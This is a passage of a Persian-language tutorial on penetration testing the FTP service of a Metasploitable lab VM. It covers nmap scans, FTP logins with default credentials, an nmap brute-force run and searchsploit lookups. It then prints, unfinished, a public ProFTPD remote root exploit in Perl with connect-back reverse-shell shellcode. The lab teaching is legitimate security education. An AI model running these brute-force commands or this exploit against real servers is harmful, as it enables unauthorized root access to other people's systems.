# آنچه گذشت
این‌ها پورت‌های باز tcp بودند که روی ماشین مجازی داشتیم:
<details>
<summary>Tcp port ports</summary>
</br>
  
  ```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-01 18:44 +0330
Nmap scan report for 192.168.56.102
Host is up (0.000088s latency).
Not shown: 65522 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
23/tcp   open  telnet
25/tcp   open  smtp
53/tcp   open  domain
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3306/tcp open  mysql
3632/tcp open  distccd
5432/tcp open  postgresql
8009/tcp open  ajp13
8180/tcp open  unknown
MAC Address: 08:00:27:B8:DA:1E (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.10 seconds

```
</details>


توی خروجی، تعداد پورت‌های بسته tcp را داشتیم: `Not shown: 65522 closed tcp ports`

شماره پورت/پروتکلش/وضعیتش و سرویسی که روی اون پورت داره اجرا میشه.

# نگاهی عمیق‌تر به پورت‌ها
اولین پورت بازی که nmpa پیدا کرده، پورت tcp ۲۱ هست که سرویس ftp روی اون اجرا میشه. اول از همه بیاین کمی بیشتر درباره این سرویس بدونیم تا بفهمیم با چی طرفیم.

پروتکل ftp یا file transfer protocol یک پروتکل tcp/ip که برای انتقال فایل بین دو دستگاه در شبکه به‌کار میره. برای درک بهتر اون می‌تونیم از یک ابزار ساده به نام ftp روی کالی لینوکس استفاده کنیم. برای اتصال به سرویس ftp روی پورت ۲۱ کاربر از دستور زیر استفاده می‌کنیم:

`ftp 192.168.56.102 -p 21`


بعد از وارد کردن دستور، این خروجی را داریم:

```
Connected to 192.168.56.102.
220 ProFTPD 1.3.1 Server (Debian) [::ffff:192.168.56.102]
Name (192.168.56.102:mahyar):
```
عبارت Connected to 192.168.56.102 یعنی روی پورت ۲۱ سرویس ftp وجود داشت و ما تونستیم بهش وصل بشیم.
اینجا هم ProFTPD 1.3.1 کد ۲۲۰ به معنی اتصال موفقیت‌آمیز هست ( سرویس و نسخه استفاده شده از پروتکل ftp را هم اینجا بهمون نشون داده `ProFTPD 1.3.1` که خودش یک ضعف امنیتی است که بعدا درموردش صحبت می‌کنیم ).
سپس از ما خواسته برای اتصال به این سرویس یک نام کاربری معتبر که در سرور ( همون ماشین مجازی ما ) تعریف شده، وارد کنیم. خب ما اینجا msfadmin یا یوزر پیشفرض متاسپلویتیبل را وارد می‌کنیم. سپس از ما رمزعبور می‌خواد که اون را هم msfadmin وارد می‌کنیم و وارد محیط ترمینال ftp میشیم. حالا اینجا می‌تونیم دستورات خودمون را برای آپلود/دانلود فایل‌ها و کارهای دیگه وارد کنیم ( لیست دستورات با ? ). با دستور زیر می‌تونیم یک فایل را از کامپیوتر تارگت دانلود کنیم:

```
cd vulnerable/mysql-ssl
get my.cnf
```

همچنین با دستور بعدی می‌تونیم یک فایل از کامپیوتر خودمون ( کالی ) روی سرور آپلود کنیم:
```
cd /tmp
put /home/mahyar/Desktop/my_simple_text.txt /tmp/aa
```

> و خب دستور ftp یک کامند قدیمی با سوییچ‌های محدود است که اینجا من یک نمونه ساده اون را برای درک سرویس ftp بهتون نشون دادم.

درنهایت اینجا ما یک سرور داریم که روی پورت ۲۱ خودش یک سرویس ftp برای اشتراک فایل اجرا کرده ( به این معنی که این ماشین مجازی ما نقش یک سرور را هم داره که کاربرهایی مثل من می‌تونه بهش وصل بشه و فایل‌های مختلف را دانلود/آپلود کنه ).

توی مرحله بعد، قصد داریم امنیت این سرویس را باهم بررسی کنیم. خب تا اینجا ما می‌دونیم روی پورت ۲۱ پروتکل ftp برای انتقال فایل‌ها توی شبکه، داره روی تارگت ما اجرا میشه. اما چه نرم‌افزاری مسئول اجرای این پروتکل است؟ و چه نسخه‌ای از اون داره روی سرور اجرا میشه؟ برای اطلاعات دقیق‌تر درباره این پورت، می‌تونیم دستور زیر را توی nmap اجرا کنیم:

```
sudo nmap -p 21 -sV -A 192.168.56.102 -T5
```

> -p 21: اینجا دیگه کل پورت‌ها رو اسکن نمی‌کنیم و هدف ما پورت ۲۱ هست

> -sV: برای بررسی سرویس و نسخه‌ای از سرویس که داره روی اون پورت اجرا میشه

> -A: اطلاعات اضافی دیگه‌ای مثل اسم و نسخه سیستم‌عامل را بهمون میده ( اگه بتونه )


و این خروجی دستور بالا هست:

<details>
<summary>Service Scan</summary>
</br>

  ```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-01 18:48 +0330
Nmap scan report for 192.168.56.102
Host is up (0.00070s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.1
MAC Address: 08:00:27:B8:DA:1E (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Network Distance: 1 hop
Service Info: OS: Unix

TRACEROUTE
HOP RTT     ADDRESS
1   0.70 ms 192.168.56.102

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.05 seconds
```

</details>


اطلاعات مهمی مثل نرم‌افزار و نسخه‌‌ای از اون که داره پروتکل ftp را اجرا می‌کنه: `ProFTPD 1.3.1`

مک آدرس سرور: `08:00:27:B8:DA:1E` که مشخص کرده تارگت ما روی (Oracle VirtualBox virtual NIC) اجرا میشه

نسخه کرنل لینوکس سرور بین 2.6.9 تا 2.6.33 است.

> [!NOTE]
> خوبه که درباره نرم‌افزار ProFTPD هم مطالعه آزاد داشته باشیم تا بدونیم چه‌جور سرویسی داره روی پورت ۲۱ پروتکل ftp را اجرا می‌کنه.
> 
> [**wikipedia:ProFTPD**](https://en.wikipedia.org/wiki/ProFTPD)
> 
> [**mihanwebhost:ProFTPD**](https://mihanwebhost.com/blog/articles/1050/%D8%A8%D9%87%D8%AA%D8%B1%DB%8C%D9%86-ftp-server-%D9%87%D8%A7-%D8%A8%D8%B1%D8%A7%DB%8C-%D9%84%DB%8C%D9%86%D9%88%DA%A9%D8%B3-%D9%88-%D9%88%DB%8C%DA%98%DA%AF%DB%8C-%D9%87%D8%A7%DB%8C-%D8%A2%D9%86%D9%87%D8%A7)

# تست نفوذ سرویس FTP
یکم قبل‌تر دیدید که ما می‌تونیم به سروری که داره سرویس ftp اجرا می‌کنه وصل بشیم، فایل‌هاش رو ببینیم، دانلود و آپلود کنیم و از طریق پورت ۲۱ و سرویس ftp به سرور خودمون توی شبکه و یا از راه دور دسترسی داشته باشیم. اما سوال اینجاست که سرویس‌های ftp که روی سرور اجرا میشند، اغلب پیکربندی‌های سفت و سختی دارند. دسترسی‌های محدود، آیپی‌آدرس‌های خاص، و یا در مثال ما، نام کاربری و رمزعبور تایید شده‌ای نیاز دارند. حالا که ما به این مقادیر ( مثلا یوزرنیم پسورد ) دسترسی نداریم، باید چیکار کنیم؟ خب به صورت کلی ۳ تا راه برای حل این مشکل، و یا دقیق‌ترش، بررسی امنیت سرویس ftp روی سرور و این‌که آیا ما به عنوان مهاجم می‌تونیم بهش وصل بشیم یا نه، وجود داره.


## راه‌حل اول: Brute Force
کمی قبل‌تر در مثال خودمون نشون دادیم که زمان اتصال به سرویس ftp، سرور از شما یک نام‌کاربری و رمزعبور معتبر می‌خواد. به این معنی که در سمت سرور این یوزرنیم پسورد تعریف شده و اگه شما اون رو بدونید، می‌تونید به سرور متصل بشید. یکی از راه‌های مرسومی که وجود داره، اینه که می‌تونید یوزرنیم پسورد این سرویس را Brute Force کنید. به این معنی که تعداد زیادی از نام‌کاربری و رمزهای‌عبور را در یک فایل ذخیره و اون‌ها را با ابزارهایی مثل خود nmpa تست می‌کنید تا شاید به یک یوزرنیم پسورد معتبر در سمت سرور برسید.
این کار رو می‌تونید با دستور زیر انجام بدید:

`sudo nmap -p 21 --script ftp-brute --script-args userdb=users.txt,passdb=passwords.txt 192.168.56.102 -vv`

> sudo: با دسترسی بالا، می‌تونیم از قابلیت‌های بیشتری استفاده کنیم

> -p 21: پورت سرویس اف‌تی‌پی که روی سرور اجرا میشه

> --script ftp-brute: یکی از اسکریپت‌های آماده ان‌مپ که میاد و برای ما بروت‌فورس را انجام میده

> --script-args: پیشنیازهای اسکریپت بروت‌فورس را تنظیم می‌کنه. که در اینجا باید یک یوزرنیم و پسورد لیست وارد کنیم

> userdb=users.txt: در اینجا من یک فایل متنی به نام users.txt ساختم که یوزرنیم‌های مختلفی را در اون قرار دادم و مسیر فایل یوزرنیم‌هام را در اینجا userdb= تنظیم کردم 

> passdb=passwords.txt: در اینجا من یک فایل متنی به نام passwords.txt ساختم که پسوردهای مختلفی را در اون قرار دادم و مسیر فایل پسوردهام را در اینجا passdb= تنظیم کردم 

> 192.168.56.102: آیپی سروری که سرویس ftp روی اون وجود داره. برای انجام حمله brute force

> -vv برای نشون‌دادن لاگ‌های بیشتر در ترمینال

> [!NOTE]
> اینجا می‌تونید users.txt و passwords.txt که من ساختم رو ببینید
> <details><summary>users.txt</summary>
> admin</br>
> test</br>
> administrator</br>
> root</br>
> anonymous</br>
> msfadmin
>
></details>
>
>
> <details><summary>passwords.txt</summary>
>admin</br>
>test</br>
>administrator</br>
>root</br>
>anonymous</br>
>msfadmin
></details>

و این خروجی nmap که بعد از تست و تلاش همه یوزریم پسوردهایی که بهش دادیم، موفق شد یک نام‌کاربری، رمزعبور معتبر را پیدا کنه

<details>
<summary>nmap brute force output</summary>
</br>

  ```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-03 19:09 +0330
NSE: Loaded 1 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 1) scan.
Initiating NSE at 19:09
Completed NSE at 19:09, 0.00s elapsed
Initiating ARP Ping Scan at 19:09
Scanning 192.168.56.102 [1 port]
Completed ARP Ping Scan at 19:09, 0.07s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 19:09
Completed Parallel DNS resolution of 1 host. at 19:09, 0.26s elapsed
Initiating SYN Stealth Scan at 19:09
Scanning 192.168.56.102 [1 port]
Discovered open port 21/tcp on 192.168.56.102
Completed SYN Stealth Scan at 19:09, 0.03s elapsed (1 total ports)
NSE: Script scanning 192.168.56.102.
NSE: Starting runlevel 1 (of 1) scan.
Initiating NSE at 19:09
Completed NSE at 19:09, 4.90s elapsed
Nmap scan report for 192.168.56.102
Host is up, received arp-response (0.00034s latency).
Scanned at 2024-07-03 19:09:33 +0330 for 5s

PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 64
| ftp-brute: 
|   Accounts: 
|     msfadmin:msfadmin - Valid credentials
|_  Statistics: Performed 88 guesses in 5 seconds, average tps: 17.6
MAC Address: 08:00:27:B8:DA:1E (Oracle VirtualBox virtual NIC)

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 1) scan.
Initiating NSE at 19:09
Completed NSE at 19:09, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 5.59 seconds
           Raw packets sent: 2 (72B) | Rcvd: 2 (72B)


```

</details>

در این بخش ما تونستیم با brute force کردن سرویس ftp روی سرور خودمون، به یوزرنیم پسورد `msfadmin:msfadmin` برسیم. اما دقت داشته باشید که ۱. این محیط آزمایشگاهی بود ۲. یوزرنیم و پسورد لیست من خیلی کوتاه و ساده بود ۳. هیچ محدودیتی روی سرویس ftp در متاسپلویتیبل نبود. در دنیای واقعی، شما نیاز دارید که چندهزار یوزرنیم به عنوان یوزر لیست خودتون و پسوردلیست خودتون داشته باشید، تا شانس پیدا شدن نام‌کاربری، رمزعبور سرور بیشتر بشه. همچنین زمان‌برتر خواهد بود و در سرورهای درست و درمون، بعد از یک تعداد تلاش مشخص برای حدس زدن یوزرنیم پسورد، آیپی شما بلاک میشه و باید از پروکسی‌سرورها یا تکنیک‌های دیگه‌ای استفاده کنید.


## راه‌حل دوم: Anonymous login
برای وصل شدن به یک ftp سرور و دیدن فایل‌هایی که اونجاست، باید یوزرنیم و پسورد تعریف‌شده‌ای را وارد کنید. در سرویس‌هایی که ftp را اجرا می‌کنند، مثل همین proFTPD، مفهومی وجود داره به اسم Anonymous login که چندین دایرکتوری/فولدر در سرور تعریف میشه و هرکسی با هرسطح دسترسی می‌تونه اونجا فایل‌هایی را قرار بده یا از اونجا فایل‌هایی رو برداره. این عمل معمولا زمانی استفاده میشه که سرور ftp بخواد فایل‌هایی را برای عموم به‌اشتراک بزاره یا حتی براثر کانفیگ‌های اشتباه، این دسترسی به همه افراد داده میشه. برای این‌که بررسی کنیم که آیا سرور ما، متاسپلویتیبل ما، Anonymous login رو قبول می‌کنه یا نه، می‌تونیم به صورت دستی و یا از ابزار nmap استفاده کنیم.
زمانی که این آپشن فعال باشه، شما به جای نام‌کاربری درخواست شده می‌تونید Anonymous را وارد کنید و رمزعبور را خالی بزارید. اگه با موفقیت وارد شدید، یعنی این آپشن روی سرور فعال بوده و حالا می‌تونید به مجموعه‌ای از فایل‌ها و فولدرها دسترسی داشته باشید. برای مثال ما دستور زیر را برای اتصال به سرور ftp وارد کردیم:

`ftp 192.168.56.102 -p 21`

و این خروجی ما بود:
```
Connected to 192.168.56.102.
220 ProFTPD 1.3.1 Server (Debian) [::ffff:192.168.56.102]
Name (192.168.56.102:mahyar): anonymous
331 Password required for anonymous
Password: 
530 Login incorrect.
ftp: Login failed
ftp> 
```

همینطور که می‌بینید، به ما گفت `Login incorrect` یا ‍`Login failed` که یعنی این آپشن روی سرویس proFTPD فعال نیست. بیاید این دفعه با nmap تست کنیم:

`sudo nmap -p 21 --script=ftp-anon 192.168.56.102`

و این خروجی دستور:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-03 19:36 +0330
Nmap scan report for 192.168.56.102
Host is up (0.00037s latency).

PORT   STATE SERVICE
21/tcp open  ftp
MAC Address: 08:00:27:B8:DA:1E (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.51 seconds
```

خروجی بالا صرفا یک اسکن ساده پورت ftp را برای ما آورد و اگه Anonymous login روی این پورت و سرویس مجاز بود، بهمون کلمه `Anonymous FTP login allowed` را توی خروجی نشون میداد.


## راه‌حل سوم: پیداکردن آسیب‌پذیری
ما دیدیم که روی پورت ۲۱ سرورمون، داره پروتکل ftp اجرا میشه که ما می‌تونیم با استفاده از این پروتکل، فایل‌های خودمون را با سرور به اشتراک بزاریم یا به فایل‌های روی سرور دسترسی داشته باشیم. در اینجا، همیشه یک سرویس، نرم‌افزار مسئول اجرای اون پروتکل خواهد بود. همانطور که در اسکن‌هامون دیدیم، روی پورت ۲۱ سرویس proFTPD نسخه ۱.۳.۱ اجرا میشه که میاد و پروتکل FTP را برای ما اجرا می‌کنه و باعث میشه بتونیم فایل‌هامون را بین سرور و کلاینت منتقل کنیم.

در قدم بعدی که سرویس و نسخه اون را شناختیم، باید از طریق منابع مختلف، ابزارها، اینترنت، به دنبال این باشیم که آیا آسیب‌پذیری شناخته‌شده‌ای برای اون نسخه از سرویس وجود داره یا نه. یکی از ابزارهایی که می‌تونیم ازش استفاده کنیم، searchsploit است که میاد و براساس نسخه اون سرویس، در دیتابیس exploitdb جستجو می‌کنه.

`searchsploit proFTPD 1.3.1`

و این خروجی:
```
Exploits: No Results
Shellcodes: No Results
```

همونطور که می‌بینید، هیچ اکسپلویت شناخته‌شده‌ای پیدا نشد. بیاید جستجوی خودمون را وسیع‌تر کنیم:

`searchsploit proFTPD 1.3.`

> توی اینجا به دنبال نسخه ۱.۳.هرچی می‌گردیم. و این خروجی ما

<details>
<summary>searchsploit output</summary>
</br>

  ```
--------------------------------------------------------------- ---------------------------------
 Exploit Title                                                 |  Path
--------------------------------------------------------------- ---------------------------------
ProFTPd - 'ftpdctl' 'pr_ctrls_connect' Local Overflow          | linux/local/394.c
ProFTPd 1.2 < 1.3.0 (Linux) - 'sreplace' Remote Buffer Overflo | linux/remote/16852.rb
ProFTPd 1.3.0 (OpenSUSE) - 'mod_ctrls' Local Stack Overflow    | unix/local/10044.pl
ProFTPd 1.3.0 - 'sreplace' Remote Stack Overflow (Metasploit)  | linux/remote/2856.pm
ProFTPd 1.3.0/1.3.0a - 'mod_ctrls' 'support' Local Buffer Over | linux/local/3330.pl
ProFTPd 1.3.0/1.3.0a - 'mod_ctrls' 'support' Local Buffer Over | linux/local/3333.pl
ProFTPd 1.3.0/1.3.0a - 'mod_ctrls' exec-shield Local Overflow  | linux/local/3730.txt
ProFTPd 1.3.0a - 'mod_ctrls' 'support' Local Buffer Overflow ( | linux/dos/2928.py
ProFTPd 1.3.2 rc3 < 1.3.3b (FreeBSD) - Telnet IAC Buffer Overf | linux/remote/16878.rb
ProFTPd 1.3.2 rc3 < 1.3.3b (Linux) - Telnet IAC Buffer Overflo | linux/remote/16851.rb
ProFTPd 1.3.3c - Compromised Source Backdoor Remote Code Execu | linux/remote/15662.txt
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)      | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution            | linux/remote/36803.py
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)        | linux/remote/49908.py
ProFTPd 1.3.5 - File Copy                                      | linux/remote/36742.txt
ProFTPD 1.3.7a - Remote Denial of Service                      | multiple/dos/49697.py
ProFTPd 1.x - 'mod_tls' Remote Buffer Overflow                 | linux/remote/4312.c
ProFTPd IAC 1.3.x - Remote Command Execution                   | linux/remote/15449.pl
ProFTPd-1.3.3c - Backdoor Command Execution (Metasploit)       | linux/remote/16921.rb
WU-FTPD 2.4/2.5/2.6 / Trolltech ftpd 1.2 / ProFTPd 1.2 / BeroF | linux/remote/20690.sh
--------------------------------------------------------------- ---------------------------------
Shellcodes: No Results


```

</details>

و اما ۲ تا آسیب پذیری اینجا نمایش داده که به نسخه سرویس ما هم مربوط میشه:

```
ProFTPd 1.x - 'mod_tls' Remote Buffer Overflow                 | linux/remote/4312.c
ProFTPd IAC 1.3.x - Remote Command Execution                   | linux/remote/15449.pl
```

اما این اکسپلویت‌ها در ابزار متاسپلویت (msfconsole) وجود نداره ( اگه داشت، روبه‌روی اون `(Metasploit)‍` قرار می‌گرفت ). همچنین بعد از بررسی سورس‌کد اون‌ها در exploitdb می‌بینم که کدها به زبان ساده c و یا perl نوشته شده و الگوی metasploit را برای import کردن نداره. پس بریم به صورت دستی این اکسپلویت‌ها را اجرا کنیم. سورس کد linux/remote/15449.pl از وب‌سایت exploitdb:

<details>
<summary>linux/remote/15449.pl</summary>
</br>

  ```
# Exploit Title: ProFTPD IAC Remote Root Exploit
# Date: 7 November 2010
# Author: Kingcope
#
# E-DB Note: If you have issues with this exploit, alter lines 549, 555 and 563.

use IO::Socket;

$numtargets = 13;

@targets =
(
 # Plain Stack Smashing

 #Confirmed to work
 ["FreeBSD 8.1 i386, ProFTPD 1.3.3a Server (binary)",# PLATFORM SPEC
 	"FreeBSD",	# OPERATING SYSTEM
 	0,			# EXPLOIT STYLE
 	0xbfbfe000,	# OFFSET START
 	0xbfbfff00,	# OFFSET END
 	1029],		# ALIGN

 #Confirmed	to work
 ["FreeBSD 8.0/7.3/7.2 i386, ProFTPD 1.3.2a/e/c Server (binary)",
 	"FreeBSD",
 	0,
 	0xbfbfe000,
 	0xbfbfff00,
 	1021],

 # Return into Libc

 #Confirmed to work
 ["Debian GNU/Linux 5.0, ProFTPD 1.3.2e Server (Plesk binary)",
 	"Linux",
 	1,			# EXPLOIT STYLE
 	0x0804CCD4,	# write(2) offset
 	8189,		# ALIGN
 	0], 		# PADDING

 # Confirmed to work
 ["Debian GNU/Linux 5.0, ProFTPD 1.3.3 Server (Plesk binary)",
 	"Linux",
 	1,
 	0x0804D23C,
 	4101,
 	0],

 #Confirmed to work
 ["Debian GNU/Linux 4.0, ProFTPD 1.3.2e Server (Plesk binary)",
 	"Linux",
 	1,
 	0x0804C9A4,
 	8189,
 	0],
 #Confirmed to work
 ["Debian Linux Squeeze/sid, ProFTPD 1.3.3a Server (distro binary)",
 	"Linux",
 	1,
 	0x080532D8,
 	4101,
 	12],

 ["SUSE Linux 9.3, ProFTPD 1.3.2e Server (Plesk binary)",
 	"Linux",
 	1,
 	0x0804C9C4,
 	8189,
 	0],

 ["SUSE Linux 10.0/10.3, ProFTPD 1.3.2e Server (Plesk binary)",
 	"Linux",
 	1,
 	0x0804CAA8,
 	8189,
 	0],

 ["SUSE Linux 10.2, ProFTPD 1.3.2e Server (Plesk binary)",
 	"Linux",
 	1,
 	0x0804CBBC,
 	8189,
 	0],

 ["SUSE Linux 11.0, ProFTPD 1.3.2e Server (Plesk binary)",
 	"Linux",
 	1,
 	0x0804CCBC,
 	8189,
 	0],

 #Confirmed to work
 ["SUSE Linux 11.1, ProFTPD 1.3.2e Server (Plesk binary)",
 	"Linux",
 	1,
 	0x0804CCE0,
 	8189,
 	0],

 ["SUSE Linux SLES 10, ProFTPD 1.3.2e Server (Plesk binary)",
 	"Linux",
 	1,
 	0x0804CA2C,
 	8189,
 	0],

 #Confirmed to work
 ["CentOS 5, ProFTPD 1.3.2e Server (Plesk binary)",
 	"Linux",
 	1,
 	0x0804C290,
 	8189,
 	0],

 	# feel free to add more targets.
);

#freebsd reverse shell port 45295
#setup a netcat on this port ^^
$bsdcbsc =
		# setreuid
        "\x31\xc0\x31\xc0\x50\x31\xc0\x50\xb0\x7e\x50\xcd\x80".
		# connect back :>
		"\x31\xc0\x31\xdb\x53\xb3\x06\x53".
        "\xb3\x01\x53\xb3\x02\x53\x54\xb0".
        "\x61\xcd\x80\x31\xd2\x52\x52\x68".
        "\x41\x41\x41\x41\x66\x68\xb0\xef".
        "\xb7\x02\x66\x53\x89\xe1\xb2\x10".
        "\x52\x51\x50\x52\x89\xc2\x31\xc0".
        "\xb0\x62\xcd\x80\x31\xdb\x39\xc3".
        "\x74\x06\x31\xc0\xb0\x01\xcd\x80".
        "\x31\xc0\x50\x52\x50\xb0\x5a\xcd".
        "\x80\x31\xc0\x31\xdb\x43\x53\x52".
        "\x50\xb0\x5a\xcd\x80\x31\xc0\x43".
        "\x53\x52\x50\xb0\x5a\xcd\x80\x31".
        "\xc0\x50\x68\x2f\x2f\x73\x68\x68".
        "\x2f\x62\x69\x6e\x89\xe3\x50\x54".
        "\x53\x50\xb0\x3b\xcd\x80\x31\xc0".
        "\xb0\x01\xcd\x80";

#linux reverse shell port 45295 by bighawk
#setup a netcat on this port ^^
$lnxcbsc =
# setreuid
"\x31\xc0\x31\xdb\x31\xc9\xb0\x46\xcd\x80\x90\x90\x90".
# connect back :>
"\x6a\x66".
"\x58".
"\x6a\x01".
"\x5b".
"\x31\xc9".
"\x51".
"\x6a\x01".
"\x6a\x02".
"\x89\xe1".
"\xcd\x80".
"\x68\x7f\x7f\x7f\x7f". # IP
"\x66\x68\xb0\xef". # PORT
"\x66\x6a\x02".
"\x89\xe1".
"\x6a\x10".
"\x51".
"\x50".
"\x89\xe1".
"\x89\xc6".
"\x6a\x03".
"\x5b".
"\x6a\x66".
"\x58".
"\xcd\x80".
"\x87\xf3".
"\x6a\x02".
"\x59".
"\xb0\x3f".
"\xcd\x80".
"\x49".
"\x79\xf9".
"\xb0\x0b".
"\x31\xd2".
"\x52".
"\x68\x2f\x2f\x73\x68".
"\x68\x2f\x62\x69\x6e".
"\x89\xe3".
"\x52".
"\x53".
"\x89\xe1".
"\xcd\x80";

sub exploit1 {
    for ($counter=$targets[$ttype][3]; $counter < $targets[$ttype][4]; $counter += 250) {
		printf("[$target] CURRENT OFFSET = %08x :pP\n", $counter);
		$ret = pack("V", $counter);
		$align = $targets[$ttype][5];

		my $sock = IO::Socket::INET->new(PeerAddr => $target,
      	                          		 PeerPort => 21,
           		                  		 Proto    => 'tcp');

		$stack = "KCOPERULEZKCOPERULEZKC" . $ret . "\x90" x 500 . $shellcode . "A" x 10;

		$v = <$sock>;

		print $sock "\x00" x $align . "\xff" . $stack . "\n";

		close($sock);
	}
}

# Linux technique to retrieve a rootshell (C) kingcope 2010
#
# uses write(2) to fetch process memory out of the remote box (you can find the offset using IDA)
# only the write(2) plt entry offset is needed for the exploit to work (and of course the
# align value)
# once the correct write value is given to the exploit it fetches the memory space of proftpd.
# with this information the exploit can find function entries and byte values
# relative to the write(2) address.
# once the memory is read out the exploit does the following to circumvent linux adress space
# randomization:
#
# 1.) calculate mmap64() plt entry
# 2.) seek for assembly instructions in the proftpd memory space relative to write(2)
#     such as pop pop ret instructions
# 3.) call mmap64() to map at address 0x10000000 with protection read,write,execute
# 4.) calculate offset for memcpy() which is later used to construct the shellcode copy routine
# 4.) copy known assembly instructions (which have been found before using the memory read)
#     to address 0x10000000. these instructions will copy the shellcode from ESP to 0x10000100
#     and make use of the memcpy found before
# 5.) actually jump to the shellcode finder
# 6.) once the shellcode has been copied to 0x10000100 jump to it
# 7.) shellcode gets executed and we have our desired root shell.

sub exploit2 {
	printf("[$target] %s :pP\n", $targets[$ttype][0]);
	$align = $targets[$ttype][4];
	$write_offset = $targets[$ttype][3];
	$padding = $targets[$ttype][5];

	$|=1;
	print "align = $align\n";
	print "Seeking for write(2)..\n";

	#known good write(2) values
	#0x0804C290
	#0x0804A85C
	#0x0804A234
	#0x08052830
	#080532D8 proftpd-basic_1.3.3a-4_i386
	#08052938 proftpd-basic_1.3.2e-4_i386 (ubunutu)
	#0804CCD4 psa-proftpd_1.3.2e-debian5.0.build95100504.17_i386 !!

	printf "Using write offset %08x.\n", $write_offset;
	$k = $write_offset;
	$sock = IO::Socket::INET->new(PeerAddr => $target,
      	                          PeerPort => 21,
           		                  Proto    => 'tcp');

	$sock->sockopt(SO_LINGER, pack("ii", 1, 0));
	#$x = <stdin>;
	$stack = "KCOPERULEZKCOPERULEZKC". "C" x $padding .
			 pack("V", $k).  # write
			 "\xcc\xcc\xcc\xcc".
			 "\x01\x00\x00\x00".	# fd for write
			 pack("V", $k). # buffer for write
			 "\xff\xff\x00\x00";	# length for write

	$v = <$sock>;

	print $sock "\x00" x $align . "\xff" . $stack . "\n";

	vec ($rfd, fileno($sock), 1) = 1;

	$timeout = 2;
    if (select ($rfd, undef, undef, $timeout) >= 0
             && vec($rfd, fileno($sock), 1))
    {
       if (read($sock, $buff, 0xffff) == 0xffff) {
		printf "\nSUCCESS. write(2) is at %08x\n", $k;
		close($sock);
		goto lbl1;
		}
    }

	close($sock);
	printf "wrong write(2) offset.\n";
	exit;

lbl1:
#	Once we're here chances are good that we get the root shell

	print "Reading memory from server...\n";
	my $sock = IO::Socket::INET->new(PeerAddr => $target,
      	                          PeerPort => 21,
           		                  Proto    => 'tcp');

	$stack = "KCOPERULEZKCOPERULEZKC" . "C" x $padding .
			 pack("V", $k).  # write
			 "\xcc\xcc\xcc\xcc".
			 "\x01\x00\x00\x00".	# fd for write
			 pack("V", $k). # buffer for write
			 "\xff\xff\x0f\x00";	# length for write

	$v = <$sock>;

	print $sock "\x00" x $align . "\xff" . $stack . "\n";

	read($sock, $buff, 0xfffff);

	if (($v = index $buff, "\x5E\x5F\x5D") >= 0) {
		$pop3ret = $k + $v;
		printf "pop pop pop ret located at %08x\n", $pop3ret;
	} else {
		print "Could not find pop pop pop ret\n";
		exit;
	}

	if (($v = index $buff, "\x83\xC4\x20\x5B\x5E\x5D\xC3") >= 0) {
		$largepopret = $k + $v;
		printf "large pop ret located at %08x\n", $largepopret;
	} else {
		print "Could not find pop pop pop ret\n";
		exit;
	}

	if (($v = index $buff, "\xC7\x44\x24\x08\x03\x00\x00\x00\xC7\x04\x24\x00\x00\x00\x00\x89\x44\x24\x04") >= 0) {
		$addr1 = $k+$v+23;

		$mmap64 = unpack("I", substr($buff, $v+20, 4));
		$mmap64 = $addr1 - (0xffffffff-$mmap64);
		printf "mmap64 is located at %08x\n", $mmap64;
	} else {
		if (($v = index $buff, "\x89\x44\x24\x10\xA1\xBC\xA5\x0F\x08\x89\x44\x24\x04\xe8") >= 0) {
			$addr1 = $k+$v+17;

			$mmap64 = unpack("I", substr($buff, $v+14, 4));
			$mmap64 = $addr1 - (0xffffffff-$mmap64);
			printf "mmap64 is located at %08x\n", $mmap64;
		} else {
			print "Could not find mmap64()\n";
			exit;
		}
	}



		if (($v = index $buff, "\x8D\x45\xF4\x89\x04\x24\x89\x54\x24\x08\x8B\x55\x08\x89\x54\x24\x04\xE8") >= 0) {
			$addr1 = $k+$v+21;
			$memcpy = unpack("I", substr($buff, $v+18, 4));
			$memcpy = $addr1 - (0xffffffff-$memcpy);
			printf "memcpy is located at %08x\n", $memcpy;
		} else {

		if (($v = index $buff, "\x8B\x56\x10\x89\x44\x24\x08\x89\x54\x24\x04\x8B\x45\xE4\x89\x04\x24\xe8") >= 0) {
			$addr1 = $k+$v+21;

			$memcpy = unpack("I", substr($buff, $v+18, 4));
			$memcpy = $addr1 - (0xffffffff-$memcpy);
			printf "memcpy is located at %08x\n", $memcpy;
		} else {
		if (($v = index $buff, "\x89\x44\x24\x04\xA1\xBC\x9F\x0E\x08\x89\x04\x24") >= 0) {
			$addr1 = $k+$v+16;

			$memcpy = unpack("I", substr($buff, $v+13, 4));
			$memcpy = $addr1 - (0xffffffff-$memcpy);
			printf "memcpy is located at %08x\n", $memcpy;
		} else {
		if (($v = index $buff, "\x89\x7C\x24\x04\x89\x1C\x24\x89\x44\x24\x08") >= 0) {
			$addr1 = $k+$v+15;

			$memcpy = unpack("I", substr($buff, $v+12, 4));
			$memcpy = $addr1 - (0xffffffff-$memcpy);
			printf "memcpy is located at %08x\n", $memcpy;

		}	 else {
